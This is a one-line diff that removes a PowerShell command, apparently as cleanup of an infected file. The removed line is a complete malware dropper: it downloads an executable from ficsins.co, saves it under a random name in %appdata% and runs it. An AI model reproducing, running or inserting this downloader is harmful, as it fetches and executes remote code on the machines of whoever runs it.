@@ -1,1 +1,0 @@
-$random = New-Object System.Random; Foreach($um in @({https://ficsins.co/sogo.exe},{http://ficsins.co/sogo.exe})) { try { $fg = $random.next(0, 61132); $pp = '%appdata%\' + $fg + '.exe'; (new-object system.net.webclient).DownloadFile($um.ToString(), $pp); Start-Process $pp; break; } catch { Write-Host $error[0].Exception } }
